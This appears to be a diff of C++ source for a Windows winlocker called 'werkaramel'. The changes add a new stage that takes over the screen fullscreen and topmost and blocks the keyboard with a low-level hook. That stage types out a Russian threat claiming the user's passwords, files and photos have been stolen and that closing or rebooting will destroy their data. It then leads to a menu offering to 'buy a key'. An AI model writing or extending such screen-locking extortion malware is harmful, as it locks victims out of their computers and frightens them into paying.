@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — 3 modes: red flash / green menu / winlocker
+// werkaramel — 4 modes: red flash / red rules / green menu / winlocker
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -13,6 +13,8 @@ HANDLE g_hOut = INVALID_HANDLE_VALUE;
 HANDLE g_hIn = INVALID_HANDLE_VALUE;
 HWND g_hCon = nullptr;
 std::wstring g_input;
+std::wstring g_typed;
+size_t g_type_pos = 0;
 bool g_done = false;
 std::mt19937 g_rng(std::random_device{}());
 
@@ -20,6 +22,23 @@ int RandInt(int lo, int hi) {
     std::uniform_int_distribution<int> d(lo, hi);
     return d(g_rng);
 }
+
+const std::wstring SCENE_TEXT =
+    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
+    L"\n"
+    L"вы скачали winlocker werkaramel. это не игрушка.\n"
+    L"уже поздно. всё что нужно — сделано.\n"
+    L"\n"
+    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
+    L"всё это уже на нашем сервере.\n"
+    L"\n"
+    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
+    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
+    L"\n"
+    L"попытка закрыть это окно = немедленная блокировка.\n"
+    L"попытка перезагрузить = потеря данных навсегда.\n"
+    L"\n"
+    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";
 
 void WOut(const std::wstring& s) {
     DWORD w = 0;
@@ -66,15 +85,24 @@ void LockConsole() {
 void FullscreenConsole() {
     LONG style = GetWindowLong(g_hCon, GWL_STYLE);
     style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
-               WS_MAXIMIZEBOX | WS_SYSMENU);
+               WS_MAXIMIZEBOX | WS_SYSMENU | WS_OVERLAPPED);
+    style |= WS_POPUP;
     SetWindowLong(g_hCon, GWL_STYLE, style);
-    ShowWindow(g_hCon, SW_HIDE);
+
+    LONG exStyle = GetWindowLong(g_hCon, GWL_EXSTYLE);
+    exStyle &= ~(WS_EX_WINDOWEDGE | WS_EX_CLIENTEDGE | WS_EX_DLGMODALFRAME);
+    SetWindowLong(g_hCon, GWL_EXSTYLE, exStyle);
+
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
+
+    ShowWindow(g_hCon, SW_HIDE);
     SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
-                 SWP_FRAMECHANGED | SWP_SHOWWINDOW);
-    ShowWindow(g_hCon, SW_SHOW);
+                 SWP_FRAMECHANGED | SWP_SHOWWINDOW | SWP_NOACTIVATE);
+    ShowWindow(g_hCon, SW_SHOWNORMAL);
     SetForegroundWindow(g_hCon);
+    SetFocus(g_hCon);
+    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh, SWP_NOMOVE | SWP_NOSIZE);
 }
 
 void LaunchSelf(const std::wstring& arg) {
@@ -110,7 +138,7 @@ LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// CMD 1 — КРАСНЫЙ (--red)
+// CMD 1 — КРАСНЫЙ FLASH (--red)
 // ═══════════════════════════════════════════════════════════
 void RunRed() {
     g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -140,16 +168,59 @@ void RunRed() {
     WOut(txt);
     std::this_thread::sleep_for(std::chrono::seconds(1));
 
-    LaunchSelf(L"--green");
+    LaunchSelf(L"--rules");
     UnhookWindowsHookEx(g_kbHook);
     ExitProcess(0);
 }
 
 // ═══════════════════════════════════════════════════════════
-// CMD 2 — ЗЕЛЁНЫЙ БАННЕР + МЕНЮ (--green)
+// CMD 2 — КРАСНЫЕ ПРАВИЛА (--rules)
 // ═══════════════════════════════════════════════════════════
+void PrintTyped() {
+    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    Gotoxy(2, 2);
+    int col = 2, row = 2;
+    for (size_t i = 0; i < g_typed.size(); ++i) {
+        wchar_t c = g_typed[i];
+        if (c == L'\n') { col = 2; row++; Gotoxy(col, row); }
+        else { WOut(std::wstring(1, c)); col++; }
+    }
+}
 
-// блочный баннер WERKARAMEL
+void RunRules() {
+    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    g_hCon = GetConsoleWindow();
+    SetConsoleOutputCP(CP_UTF8);
+    SetConsoleCP(CP_UTF8);
+    FullscreenConsole();
+    LockConsole();
+
+    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
+                                 GetModuleHandleW(nullptr), 0);
+
+    ClearScreen(0);
+    auto start = std::chrono::steady_clock::now();
+    while (g_type_pos < SCENE_TEXT.size()) {
+        g_typed += SCENE_TEXT[g_type_pos++];
+        PrintTyped();
+        std::this_thread::sleep_for(std::chrono::milliseconds(40));
+    }
+    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
+        std::chrono::steady_clock::now() - start).count();
+    if (elapsed < 4000)
+        std::this_thread::sleep_for(std::chrono::milliseconds(4000 - elapsed));
+
+    // ждём 2 секунды и переходим к меню
+    std::this_thread::sleep_for(std::chrono::seconds(2));
+
+    LaunchSelf(L"--menu");
+    UnhookWindowsHookEx(g_kbHook);
+    ExitProcess(0);
+}
+
+// ═══════════════════════════════════════════════════════════
+// CMD 3 — ЗЕЛЁНОЕ МЕНЮ (--menu)
+// ═══════════════════════════════════════════════════════════
 const wchar_t* BANNER[] = {
     L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
     L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
@@ -165,25 +236,21 @@ void PrintMenu() {
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
     int rows = csbi.dwSize.Y;
 
-    // баннер WERKARAMEL зелёным сверху
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
     for (int i = 0; i < 6; ++i) {
         Gotoxy(2, 1 + i);
         WOut(BANNER[i]);
     }
 
-    // подзаголовок WINLOCKER
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
     Gotoxy(2, 8);
     WOut(L"                        W I N L O C K E R");
 
-    // разделитель
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
     Gotoxy(2, 10);
     std::wstring line(78, L'─');
     WOut(line);
 
-    // меню слева
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
     Gotoxy(4, 12); WOut(L"Выберите действие:");
 
@@ -192,23 +259,26 @@ void PrintMenu() {
     Gotoxy(4, 15); WOut(L"[ 2 ]   Купить ключ");
     Gotoxy(4, 16); WOut(L"[ 3 ]   Выйти");
 
-    // подсказка внизу
     SetColor(FOREGROUND_GREEN);
     Gotoxy(4, rows - 4); WOut(L"введите число и нажмите Enter");
 
-    // строка ввода
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
     Gotoxy(4, rows - 2); WOut(L"> ");
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
     WOut(g_input + L"  ");
 }
 
-void RunGreen() {
+void RunMenu() {
     g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
     g_hIn = GetStdHandle(STD_INPUT_HANDLE);
     g_hCon = GetConsoleWindow();
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
+
+    DWORD mode = 0;
+    GetConsoleMode(g_hIn, &mode);
+    SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);
+
     FullscreenConsole();
     LockConsole();
 
@@ -216,13 +286,17 @@ void RunGreen() {
                                  GetModuleHandleW(nullptr), 0);
 
     PrintMenu();
+    SetForegroundWindow(g_hCon);
+    SetFocus(g_hCon);
+    std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    PrintMenu();
 
     INPUT_RECORD rec;
     DWORD read = 0;
 
     while (!g_done) {
         if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
-            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
             continue;
         }
         if (rec.EventType != KEY_EVENT) continue;
@@ -252,7 +326,7 @@ void RunGreen() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// CMD 3 / EXE — WINLOCKER (--locker)
+// WINLOCKER EXE (--locker)
 // ═══════════════════════════════════════════════════════════
 const COLORREF C_BG = RGB(0, 0, 0);
 const COLORREF C_RED = RGB(220, 30, 30);
@@ -381,7 +455,8 @@ void RunLocker() {
 int wmain(int argc, wchar_t** argv) {
     for (int i = 1; i < argc; ++i) {
         if (wcscmp(argv[i], L"--red") == 0) { RunRed(); return 0; }
-        if (wcscmp(argv[i], L"--green") == 0) { RunGreen(); return 0; }
+        if (wcscmp(argv[i], L"--rules") == 0) { RunRules(); return 0; }
+        if (wcscmp(argv[i], L"--menu") == 0) { RunMenu(); return 0; }
         if (wcscmp(argv[i], L"--locker") == 0) {
             ShowWindow(GetConsoleWindow(), SW_HIDE);
             RunLocker();
